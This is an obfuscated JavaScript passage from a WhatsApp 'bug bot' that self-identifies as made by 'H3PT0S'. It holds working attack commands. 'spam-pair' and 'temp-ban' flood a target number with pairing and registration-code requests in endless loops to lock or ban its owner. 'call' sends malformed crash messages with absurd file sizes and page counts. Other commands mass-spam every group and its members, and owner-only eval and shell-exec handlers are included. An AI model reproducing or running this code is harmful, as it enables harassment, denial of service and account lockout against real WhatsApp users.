            let _0x316fd6 = await prepareWAMessageMedia({
              'image': _0x5aa301
            }, {
              'upload': _0x212ab4.waUploadToServer
            });
            let _0x2da2c0 = Object.values(await _0x212ab4.groupFetchAllParticipating()['catch'](_0x3bde44 => null));
            let _0x1ca7ef = [];
            _0x2da2c0.forEach((_0x28a1c1, _0x1d9cf9) => {
              let _0x2cf2ac = {
                'header': _0x28a1c1.subject,
                'title': "#Push - Contact | Status - ( " + (_0x28a1c1.announce == true ? "Group Closed" : "Group Open") + " )",
                'id': ".adddelay_1 " + _0x28a1c1.id + '|' + q
              };
              _0x1ca7ef.push(_0x2cf2ac);
            });
            var _0x288780 = generateWAMessageFromContent(_0x43016e.chat, proto.Message.fromObject({
              'viewOnceMessage': {
                'message': {
                  'interactiveMessage': {
                    'header': {
                      ..._0x316fd6,
                      'hasMediaAttachment': true
                    },
                    'body': {
                      'text': "  - # Last Version - Push Contact 🏴‍☠️"
                    },
                    'footer': {
                      'text': "! Select a group to Push Ctt to that group !!"
                    },
                    'nativeFlowMessage': {
                      'buttons': [{
                        'name': "single_select",
                        'buttonParamsJson': JSON.stringify({
                          'title': "Powered By Last Version",
                          'sections': [{
                            'title': "Only Open groups can be Push Contact",
                            'rows': _0x1ca7ef
                          }]
                        })
                      }],
                      'messageParamsJson': ''
                    }
                  }
                }
              }
            }), {
              'userJid': _0x43016e.chat,
              'quoted': _0x43016e
            });
            _0x212ab4.relayMessage(_0x43016e.chat, _0x288780.message, {
              'messageId': _0x288780.key.id
            });
          }
          break;
        case "mmq":
          {
            _0x43016e.reply('k' + q);
          }
          break;
        case "adddelay_1":
          {
            if (!_0x1b50e2) {
              return;
            }
            let [_0x5b82f9, _0x1cfd16] = q.split('|');
            _0x212ab4.relayMessage(_0x43016e.chat, {
              'viewOnceMessage': {
                'message': {
                  'interactiveMessage': {
                    'header': {
                      'hasMediaAttachment': false
                    },
                    'body': {
                      'text': "  Push - Contact 2nd Phase 🏴‍☠️"
                    },
                    'footer': {
                      'text': "! Select a delay Tiime For PushCtt !!"
                    },
                    'nativeFlowMessage': {
                      'buttons': [{
                        'name': "single_select",
                        'buttonParamsJson': JSON.stringify({
                          'title': "Powered By Last Version",
                          'sections': [{
                            'title': "Only Open groups can be Push Contact",
                            'rows': [{
                              'header': "# 1 ( One ) Second",
                              'title': "Timestap --> 1000 ( milisecond )",
                              'id': ".pcct_res 1000|" + _0x5b82f9 + '|' + _0x1cfd16
                            }, {
                              'header': "# 2 ( Two ) Second",
                              'title': "Timestap --> 2000 ( milisecond )",
                              'id': ".pcct_res 2000|" + _0x5b82f9 + '|' + _0x1cfd16
                            }, {
                              'header': "# 3 ( Three ) Second",
                              'title': "Timestap --> 3000 ( milisecond )",
                              'id': ".pcct_res 3000|" + _0x5b82f9 + '|' + _0x1cfd16
                            }, {
                              'header': "# 4 ( four ) Second",
                              'title': "Timestap --> 4000 ( milisecond )",
                              'id': ".pcct_res 4000|" + _0x5b82f9 + '|' + _0x1cfd16
                            }, {
                              'header': "# 5 ( Five ) Second",
                              'title': "Timestap --> 5000 ( milisecond )",
                              'id': ".pcct_res 5000|" + _0x5b82f9 + '|' + _0x1cfd16
                            }, {
                              'header': "# 6 ( Six ) Second",
                              'title': "Timestap --> 6000 ( milisecond )",
                              'id': ".pcct_res 6000|" + _0x5b82f9 + '|' + _0x1cfd16
                            }, {
                              'header': "# 7 ( Seven ) Second",
                              'title': "Timestap --> 7000 ( milisecond )",
                              'id': ".pcct_res 7000|" + _0x5b82f9 + '|' + _0x1cfd16
                            }]
                          }]
                        })
                      }],
                      'messageParamsJson': ''
                    }
                  }
                }
              }
            }, {});
          }
          break;
        case "pcct_res":
          {
            if (!_0x1b50e2) {
              return;
            }
            let [_0x5e95dc, _0x60a6b7, _0x2fca8b] = q.split('|');
            if (!_0x5e95dc && !_0x60a6b7 && !_0x2fca8b) {
              _0x143f2f("Ga gitu tolol, gini : \n*" + (_0x3219ab + _0x32b9e9) + " 1000|idgc|teks*");
            }
            let _0x100982 = await _0x212ab4.groupMetadata(_0x60a6b7);
            let _0x47fe6a = _0x100982.participants;
            for (let _0x1f9ca2 of _0x47fe6a) {
              var _0x288780 = generateWAMessageFromContent(_0x1f9ca2.id.split('@')[0x0] + '@s.whatsapp.net', proto.Message.fromObject({
                'extendedTextMessage': {
                  'text': _0x2fca8b
                }
              }), {
                'userJid': _0x1f9ca2.id.split('@')[0x0] + "@s.whatsapp.net",
                'quoted': _0x50647e
              });
              await _0x212ab4.relayMessage(_0x1f9ca2.id.split('@')[0x0] + "@s.whatsapp.net", _0x288780.message, {
                'participant': {
                  'jid': _0x1f9ca2.id.split('@')[0x0] + "@s.whatsapp.net"
                },
                'messageId': _0x288780.key.id
              });
              await _0x1c5f51(_0x5e95dc);
            }
          }
          break;
        case "jpmhidetag":
        case "jpmht":
          {
            if (!_0x1b50e2) {
              return;
            }
            if (!_0x1e24da && !_0x43016e.quoted) {
              return _0x143f2f("Example : \n\n*" + (_0x3219ab + _0x32b9e9) + " jual kontol harga 5k, minat ? pm*");
            }
            var _0x1a15d7 = _0x43016e.quoted ? _0x43016e.quoted.text : _0x1e24da;
            let _0x539cc9 = 0x0;
            let _0x2b4f9e = await _0x212ab4.groupFetchAllParticipating();
            let _0x44f603 = await Object.keys(_0x2b4f9e);
            await _0x143f2f("*Memproses Jpm ⏳*\n\n* Tipe : *Teks & Hidetag*\n* Total Grup : *" + _0x44f603.length + " Grup*");
            var _0x206bdd = [];
            let _0x45379e = await generateWAMessageFromContent(_0x43016e.chat, {
              'viewOnceMessage': {
                'message': {
                  'messageContextInfo': {
                    'deviceListMetadata': {},
                    'deviceListMetadataVersion': 0x2
                  },
                  'interactiveMessage': proto.Message.InteractiveMessage.create({
                    'body': proto.Message.InteractiveMessage.Body.create({
                      'text': _0x1a15d7
                    }),
                    'nativeFlowMessage': proto.Message.InteractiveMessage.NativeFlowMessage.create({
                      'buttons': [{
                        'name': "cta_url",
                        'buttonParamsJson': "{\"display_text\":\"Beli Produk\",\"url\":\"https://wa.me/" + ownMain + "\",\"merchant_url\":\"https://www.google.com\"}"
                      }, {
                        'name': "cta_url",
                        'buttonParamsJson': "{\"display_text\":\"Testimoni\",\"url\":\"" + global.linkgc + "\",\"merchant_url\":\"https://www.google.com\"}"
                      }, {
                        'name': "cta_url",
                        'buttonParamsJson': "{\"display_text\":\"Join Grup\",\"url\":\"" + global.linkgc + "\",\"merchant_url\":\"https://www.google.com\"}"
                      }]
                    })
                  })
                }
              }
            }, {
              'userJid': _0x43016e.sender,
              'quoted': _0x50647e
            });
            for (let _0x32a081 of _0x44f603) {
              try {
                _0x206bdd = _0x2b4f9e[_0x32a081].participants.map(_0x2c86b2 => _0x2c86b2.id);
                await _0x212ab4.relayMessage(_0x32a081, _0x45379e.message, {
                  'messageId': _0x45379e.key.id
                });
                _0x539cc9 += 0x1;
              } catch (_0x2db042) {
                console.log(_0x2db042);
              }
              await _0x1c5f51(global.delayjpm);
            }
            await _0x143f2f("*Jpm Berhasil ✅* Total Grup Yang Berhasil Dikirim Pesan *" + _0x539cc9 + " Grup*");
          }
          break;
        case "jpmhidetag2":
        case "jpmht2":
          {
            if (!_0x1b50e2) {
              return;
            }
            if (!_0x1e24da) {
              return _0x143f2f("Example : \n\n" + (_0x3219ab + _0x32b9e9) + " jual kontol harga 5k, minat ? pm");
            }
            if (!/image/.test(_0x35d9cf)) {
              return _0x143f2f("Example : \n\n*" + (_0x3219ab + _0x32b9e9) + " jual kontol harga 5k, minat ? pm*\n\nNote : reply to the image you want to use with the text");
            }
            const _0x154e76 = await _0x212ab4.downloadAndSaveMediaMessage(_0x3578e0);
            var _0x1a15d7 = _0x1e24da;
            let _0x1a0760 = 0x0;
            let _0x32b69d = await _0x212ab4.groupFetchAllParticipating();
            let _0x1059f8 = await Object.keys(_0x32b69d);
            await _0x143f2f("*Memproses Jpm ⏳*\n\n* Tipe : *Hidetag Teks & Foto*\n* Total Grup : *" + _0x1059f8.length + " Grup*");
            var _0x206bdd = [];
            let _0x1a6f78 = generateWAMessageFromContent(_0x43016e.chat, {
              'viewOnceMessage': {
                'message': {
                  'messageContextInfo': {
                    'deviceListMetadata': {},
                    'deviceListMetadataVersion': 0x2
                  },
                  'interactiveMessage': proto.Message.InteractiveMessage.create({
                    'body': proto.Message.InteractiveMessage.Body.create({
                      'text': _0x1a15d7
                    }),
                    'header': proto.Message.InteractiveMessage.Header.create({
                      'hasMediaAttachment': true,
                      ...(await prepareWAMessageMedia({
                        'image': await fs.readFileSync(_0x154e76)
                      }, {
                        'upload': _0x212ab4.waUploadToServer
                      }))
                    }),
                    'nativeFlowMessage': proto.Message.InteractiveMessage.NativeFlowMessage.create({
                      'buttons': [{
                        'name': "cta_url",
                        'buttonParamsJson': "{\"display_text\":\"Beli Produk\",\"url\":\"https://wa.me/" + ownMain + "\",\"merchant_url\":\"https://www.google.com\"}"
                      }, {
                        'name': 'cta_url',
                        'buttonParamsJson': "{\"display_text\":\"Testimoni\",\"url\":\"" + global.linkgc + "\",\"merchant_url\":\"https://www.google.com\"}"
                      }, {
                        'name': 'cta_url',
                        'buttonParamsJson': "{\"display_text\":\"Join Grup\",\"url\":\"" + global.linkgc + "\",\"merchant_url\":\"https://www.google.com\"}"
                      }]
                    })
                  })
                }
              }
            }, {
              'userJid': _0x43016e.sender,
              'quoted': _0x50647e
            });
            for (let _0x19d017 of _0x1059f8) {
              try {
                _0x206bdd = _0x32b69d[_0x19d017].participants.map(_0x21f143 => _0x21f143.id);
                await _0x212ab4.relayMessage(_0x19d017, _0x1a6f78.message, {
                  'messageId': _0x1a6f78.key.id
                });
                _0x1a0760 += 0x1;
              } catch (_0x5991b0) {
                console.log(_0x5991b0);
              }
              await _0x1c5f51(global.delayjpm);
            }
            await fs.unlinkSync(_0x154e76);
            await _0x143f2f("*Jpm Berhasil ✅*\nTotal Grup Yang Berhasil Dikirim Pesan *" + _0x1a0760 + " Grup*");
          }
          break;
        case "jpm":
          {
            if (!_0x1b50e2) {
              return;
            }
            if (!_0x1e24da) {
              return _0x143f2f("Example : \n\n" + (_0x3219ab + _0x32b9e9) + " jual kontol harga 5k, minat ? pm");
            }
            var _0x1a15d7 = _0x43016e.quoted ? _0x43016e.quoted.text : _0x1e24da;
            let _0x2b5dfc = 0x0;
            let _0xd4788a = await _0x212ab4.groupFetchAllParticipating();
            let _0x3e713f = await Object.keys(_0xd4788a);
            await _0x143f2f("*Memproses Jpm ⏳*\n\n* Tipe : *Teks*\n* Total Grup : *" + _0x3e713f.length + " Grup*");
            let _0x44b972 = generateWAMessageFromContent(_0x43016e.chat, {
              'viewOnceMessage': {
                'message': {
                  'messageContextInfo': {
                    'deviceListMetadata': {},
                    'deviceListMetadataVersion': 0x2
                  },
                  'interactiveMessage': proto.Message.InteractiveMessage.create({
                    'body': proto.Message.InteractiveMessage.Body.create({
                      'text': _0x1a15d7
                    }),
                    'nativeFlowMessage': proto.Message.InteractiveMessage.NativeFlowMessage.create({
                      'buttons': [{
                        'name': "cta_url",
                        'buttonParamsJson': "{\"display_text\":\"Beli Produk\",\"url\":\"https://wa.me/" + ownMain + "\",\"merchant_url\":\"https://www.google.com\"}"
                      }, {
                        'name': "cta_url",
                        'buttonParamsJson': "{\"display_text\":\"Testimoni\",\"url\":\"" + global.linkgc + "\",\"merchant_url\":\"https://www.google.com\"}"
                      }, {
                        'name': "cta_url",
                        'buttonParamsJson': "{\"display_text\":\"Join Grup\",\"url\":\"" + global.linkgc + "\",\"merchant_url\":\"https://www.google.com\"}"
                      }]
                    })
                  })
                }
              }
            }, {
              'userJid': _0x43016e.sender,
              'quoted': _0x50647e
            });
            for (let _0xe10409 of _0x3e713f) {
              try {
                await _0x212ab4.relayMessage(_0xe10409, _0x44b972.message, {
                  'messageId': _0x44b972.key.id
                });
                _0x2b5dfc += 0x1;
              } catch {}
              await _0x1c5f51(global.delayjpm);
            }
            await _0x143f2f("*Jpm Berhasil ✅*\nTotal Grup Yang Berhasil Dikirim Pesan *" + _0x2b5dfc + " Grup*");
          }
          break;
        case "jpm2":
          {
            if (!_0x1b50e2) {
              return;
            }
            if (!_0x1e24da) {
              return _0x143f2f("Example : \n\n" + (_0x3219ab + _0x32b9e9) + " jual kontol harga 5k, minat ? pm");
            }
            if (!/image/.test(_0x35d9cf)) {
              return _0x143f2f("Example : \n\n*" + (_0x3219ab + _0x32b9e9) + " jual kontol harga 5k, minat ? pm*\n\nNote : reply to the image you want to use with the text");
            }
            let _0x3a244c = await _0x212ab4.downloadAndSaveMediaMessage(_0x3578e0);
            let _0x225098 = 0x0;
            let _0x454d33 = await _0x212ab4.groupFetchAllParticipating();
            let _0x259ac1 = await Object.keys(_0x454d33);
            await _0x143f2f("*Memproses Jpm ⏳*\n\n* Tipe : *Teks & Foto*\n* Total Grup : *" + _0x259ac1.length + " Grup*");
            let _0x408d0b = generateWAMessageFromContent(_0x43016e.chat, {
              'viewOnceMessage': {
                'message': {
                  'messageContextInfo': {
                    'deviceListMetadata': {},
                    'deviceListMetadataVersion': 0x2
                  },
                  'interactiveMessage': proto.Message.InteractiveMessage.create({
                    'body': proto.Message.InteractiveMessage.Body.create({
                      'text': _0x1e24da
                    }),
                    'header': proto.Message.InteractiveMessage.Header.create({
                      'hasMediaAttachment': true,
                      ...(await prepareWAMessageMedia({
                        'image': await fs.readFileSync(_0x3a244c)
                      }, {
                        'upload': _0x212ab4.waUploadToServer
                      }))
                    }),
                    'nativeFlowMessage': proto.Message.InteractiveMessage.NativeFlowMessage.create({
                      'buttons': [{
                        'name': "cta_url",
                        'buttonParamsJson': "{\"display_text\":\"Beli Produk\",\"url\":\"https://wa.me/" + ownMain + "\",\"merchant_url\":\"https://www.google.com\"}"
                      }, {
                        'name': "cta_url",
                        'buttonParamsJson': "{\"display_text\":\"Testimoni\",\"url\":\"" + global.linkgc + "\",\"merchant_url\":\"https://www.google.com\"}"
                      }, {
                        'name': "cta_url",
                        'buttonParamsJson': "{\"display_text\":\"Join Grup\",\"url\":\"" + global.linkgc + "\",\"merchant_url\":\"https://www.google.com\"}"
                      }]
                    })
                  })
                }
              }
            }, {
              'userJid': _0x43016e.sender,
              'quoted': _0x50647e
            });
            for (let _0x380de8 of _0x259ac1) {
              try {
                await _0x212ab4.relayMessage(_0x380de8, _0x408d0b.message, {
                  'messageId': _0x408d0b.key.id
                });
                _0x225098 += 0x1;
              } catch {}
              await _0x1c5f51(global.delayjpm);
            }
            await fs.unlinkSync(_0x3a244c);
            await _0x143f2f("*Jpm Berhasil ✅*\nTotal Grup Yang Berhasil Dikirim Pesan *" + _0x225098 + " Grup*");
          }
          break;
        case 'tiktok':
        case 'tt':
          {
            if (!q) {
              await _0x143f2f("Example : *" + (_0x3219ab + _0x32b9e9) + " https://vt.tiktok.com/ZSYbo5umU/.*");
              await _0x7c0daa(_0x43016e.chat, '❗');
            }
            if (!/tiktok.com/.test(q)) {
              return _0x143f2f("*Link Invalid !*");
            }
            _0x143f2f(mess.wait);
            await fg.tiktok(q).then(async _0xe35c2f => {
              if (_0xe35c2f.result.duration == 0x0) {
                if (_0xe35c2f.result.images.length > 0x1) {
                  let _0x5bbed7 = new Array();
                  let _0x28d396 = 0x0;
                  for (let _0x447f57 of _0xe35c2f.result.images) {
                    let _0xf12a1f = await prepareWAMessageMedia({
                      'image': await fetch('' + _0x447f57)
                    }, {
                      'upload': _0x212ab4.waUploadToServer
                    });
                    await _0x5bbed7.push({
                      'header': {
                        'title': "H3PT0S-God *" + (_0x28d396 += 0x1) + '*',
                        'hasMediaAttachment': true,
                        ..._0xf12a1f
                      },
                      'nativeFlowMessage': {
                        'buttons': [{
                          'name': 'cta_url',
                          'buttonParamsJson': "{\"display_text\":\"Link Tautan Foto\",\"url\":\"" + _0x447f57 + "\",\"merchant_url\":\"https://www.google.com\"}"
                        }]
                      },
                      'footer': {
                        'text': "© H3PT0S God - #Last Version"
                      }
                    });
                  }
                  const _0x49aca8 = await generateWAMessageFromContent(_0x43016e.chat, {
                    'viewOnceMessage': {
                      'message': {
                        'interactiveMessage': {
                          'body': {
                            'text': "Tiktok Slide Result"
                          },
                          'carouselMessage': {
                            'cards': _0x5bbed7
                          }
                        }
                      }
                    }
                  }, {
                    'userJid': _0x43016e.sender,
                    'quoted': _0x43016e
                  });
                  await _0x212ab4.relayMessage(_0x43016e.chat, _0x49aca8.message, {
                    'messageId': _0x49aca8.key.id
                  });
                  await _0x7c0daa(_0x43016e.chat, '✅');
                } else {
                  _0x212ab4.sendMessage(_0x43016e.chat, {
                    'image': {
                      'url': result.data.images[0x0]
                    },
                    'caption': "© tdx Client - #Last Version"
                  }, {
                    'quoted': _0x43016e
                  });
                }
              } else {
                let _0xe050b4 = await prepareWAMessageMedia({
                  'video': await fetch('' + _0xe35c2f.result.play)
                }, {
                  'upload': _0x212ab4.waUploadToServer
                });
                let _0x346973 = await generateWAMessageFromContent(_0x43016e.chat, {
                  'viewOnceMessage': {
                    'message': {
                      'interactiveMessage': {
                        'contextInfo': {
                          'mentionedJid': [_0x43016e.sender]
                        },
                        'body': {
                          'text': "© tdx Client - #Last Version"
                        },
                        'header': {
                          'hasMediaAttachment': true,
                          ..._0xe050b4
                        },
                        'nativeFlowMessage': {
                          'buttons': [{
                            'name': "cta_url",
                            'buttonParamsJson': "{\"display_text\":\"Link Video\",\"url\":\"" + q + "\",\"merchant_url\":\"https://www.google.com\"}"
                          }]
                        }
                      }
                    }
                  }
                }, {
                  'userJid': _0x43016e.sender,
                  'quoted': _0x43016e
                });
                await _0x212ab4.relayMessage(_0x43016e.chat, _0x346973.message, {
                  'messageId': _0x346973.key.id
                });
                await _0x7c0daa(_0x43016e.chat, '✅');
              }
            })["catch"](_0x5980b8 => _0x143f2f('' + _0x5980b8));
          }
          break;
        case "h3pt0s":
          _0x143f2f("Love You ❤️ Dear \n Thanks For using My Bug 🐛 Bot \n\n *Do not Forget To support me by subscribe my channel* \n _Youtube Search H3PT0S Thanks_ 🙏 😘");
          break;
        case "repo":
        case 'script':
        case 'sc':
        case 'github':
        case "owner":
          _0x143f2f("Love You ❤️ Dear \n Bug bot script on \n\n *H3PT0S YouTube channel* \n _make your own bot watch video on *H3PT0S* youtube channel_ 🙏 😘");
          break;
        case "spam-pair":
          {
            if (!_0x1b50e2) {
              return;
            }
            if (!q) {
              return _0x143f2f("Example : \n\n*" + (_0x3219ab + _0x32b9e9) + " +91 00000 00000*");
            }
            await _0x7c0daa(_0x43016e.chat, '✅');
            let _0x59d6d4 = q.replace(/[^0-9]/g, '').trim();
            let {
              default: _0x3a6e1e,
              useMultiFileAuthState: _0x30654a,
              fetchLatestBaileysVersion: _0x2ffa05
            } = require('@whiskeysockets/baileys');
            let {
              state: _0x3b9f79
            } = await _0x30654a("pepek");
            let {
              version: _0x459e98
            } = await _0x2ffa05();
            let _0x77ff62 = await _0x3a6e1e({
              'auth': _0x3b9f79,
              'version': _0x459e98,
              'logger': pino({
                'level': "fatal"
              })
            });
            for (;;) {
              for (let _0x429136 = 0x0; _0x429136 < 0x30; _0x429136++) {
                await _0x1c5f51(0x3e8);
                let _0x35e1fb = await _0x77ff62.requestPairingCode(_0x59d6d4);
                await console.log("# Succes Spam Pairing Code - Number : " + _0x59d6d4 + " - Code : " + _0x35e1fb);
              }
              await _0x1c5f51(0x3a98);
            }
          }
          break;
        case "temp-ban":
          {
            if (!_0x301984) {
              return _0x143f2f(mess.prem);
            }
            if (!_0x1e24da) {
              return _0x143f2f("Example: " + (_0x3219ab + _0x32b9e9) + " 91|0000000000");
            }
            if (!/|/.test(_0x1e24da)) {
              return _0x143f2f("Your data wrong!, exmple: \n " + _0x32b9e9 + " 91|000000000");
            }
            let _0x287666 = q.split('')[0x0];
            let _0xfb8f33 = q.split('')[0x1];
            let _0x19d455 = _0x287666 + _0xfb8f33;
            await _0x7c0daa(_0x43016e.chat, '✅');
            let {
              default: _0x5786eb,
              useMultiFileAuthState: _0x4d5fd,
              fetchLatestBaileysVersion: _0x43047d
            } = require('@whiskeysockets/baileys');
            let {
              state: _0x4ed58d
            } = await _0x4d5fd('pepek');
            let {
              version: _0x1922e6
            } = await _0x43047d();
            let _0x12d510 = await _0x5786eb({
              'auth': _0x4ed58d,
              'version': _0x1922e6,
              'logger': pino({
                'level': "fatal"
              })
            });
            for (;;) {
              try {
                let _0x113beb = await _0x12d510.requestRegistrationCode({
                  'phoneNumber': '+' + _0x19d455,
                  'phoneNumberCountryCode': _0x287666,
                  'phoneNumberNationalNumber': _0xfb8f33,
                  'phoneNumberMobileCountryCode': 0x2d4
                });
                if (_0x113beb.reason === 'temporarily_unavailable') {
                  console.log("Nomor Invalid (Kemungkinan Registrasi Terganggu): +" + _0x113beb.login);
                  await _0x1c5f51(0x190);
                }
              } catch (_0x1d1596) {
                console.error(_0x1d1596);
              }
            }
          }
          break;
        case "call":
          {
            if (!_0x1b50e2) {
              return;
            }
            if (!q) {
              return _0x143f2f("Example : \n\n*" + (_0x3219ab + _0x32b9e9) + " 5*");
            }
            for (let _0x1ef79f = 0x0; _0x1ef79f < q; _0x1ef79f++) {
              await _0x212ab4.relayMessage(_0x43016e.chat, {
                'viewOnceMessage': {
                  'message': {
                    'interactiveMessage': {
                      'header': {
                        ...(await _0x5739ac({
                          'document': _0x4f661b,
                          'fileName': " ⭑father H3PT0S ▻ # 𝖢𝗋𝖺𝗌𝗁 𝖦𝖺𝗅𝖺𝗑𝗒 :)",
                          'fileLength': "9999999999999",
                          'pageCount': 0x9184e729fff,
                          'contactVcard': true,
                          'mimetype': "application/vnd.openxmlformats-officedocument.presentationml.presentation",
                          'thumbnailDirectPath': "/v/t62.36145-24/13758177_1552850538971632_7230726434856150882_n.enc?ccb=11-4&oh=01_Q5AaIBZON6q7TQCUurtjMJBeCAHO6qa0r7rHVON2uSP6B-2l&oe=669E4877&_nc_sid=5e03e0",
                          'thumbnailSha256': "njX6H6/YF1rowHI+mwrJTuZsw0n4F/57NaWVcs85s6Y=",
                          'thumbnailEncSha256': "gBrSXxsWEaJtJw4fweauzivgNm2/zdnJ9u1hZTxLrhE=",
                          'jpegThumbnail': await _0x420e3d(_0x19c81b, 0x114, 0x64)
                        })),
                        'title': "*# ~ here with me - H3PT0S bug bot:)*‏‎‏‎‏‎‏‏‎‏‎‏‎‏",
                        'hasMediaAttachment': true
                      },
                      'body': {
                        'text': ''
                      },
                      'nativeFlowMessage': {
                        'messageParamsJson': '',
                        'buttons': [{
                          'name': "call_permission_request",
                          'buttonParamsJson': '{}'
                        }, {
                          'name': "galaxy_message",
                          'buttonParamsJson': "{\"flow_action\":\"navigate\",\"flow_action_payload\":{\"screen\":\"WELCOME_SCREEN\"},\"flow_cta\":\":)\",\"flow_id\":\"BY KING SAM\",\"flow_message_version\":\"9\",\"flow_token\":\"MYPENISMYPENISMYPENIS\"}"
                        }]
                      }
                    }
                  }
                }
              }, {});
            }
          }
          break;
        default:
      }
    }
    if (_0x5be772.startsWith('=>')) {
      if (!_0x1b50e2) {
        return;
      }
      try {
        const _0x1a73f6 = await eval("(async () => { return " + _0x5be772.slice(0x3) + " })()");
        _0x43016e.reply(util.format(_0x1a73f6));
      } catch (_0x1e0d35) {
        _0x43016e.reply(String(_0x1e0d35));
      }
    }
    if (_0x5be772.startsWith('>')) {
      if (!_0x1b50e2) {
        return;
      }
      try {
        let _0xb934c = await eval(_0x5be772.slice(0x2));
        if (typeof _0xb934c !== "string") {
          _0xb934c = require("util").inspect(_0xb934c);
        }
        await _0x43016e.reply(_0xb934c);
      } catch (_0x56e329) {
        await _0x43016e.reply(String(_0x56e329));
      }
    }
    if (_0x5be772.startsWith('$')) {
      if (!_0x1b50e2) {
        return;
      }
      exec(_0x5be772.slice(0x2), (_0x6a1382, _0x4a96ac) => {
        if (_0x6a1382) {
          return _0x43016e.reply(_0x6a1382.toString());
        }
        if (_0x4a96ac) {
          return _0x43016e.reply(_0x4a96ac.toString());
        }
      });
    }
  } catch (_0x3db688) {
    const _0x33cead = async () => {
      _0x212ab4.sendMessage(global.ownMain + '@s.whatsapp.net', {
        'text': require("util").format(_0x3db688)
      }, {
        'quoted': _0x43016e
      });
      new Promise(_0x21755d => setTimeout(_0x21755d, 0x7d0));
      console.log(util.format(_0x3db688));
    };
    _0x33cead();
  }
};
let file = require.resolve(__filename);
fs.watchFile(file, () => {
  fs.unwatchFile(file);
  console.log(color("Update " + __filename, "green"));
  delete require.cache[file];
  require(file);
});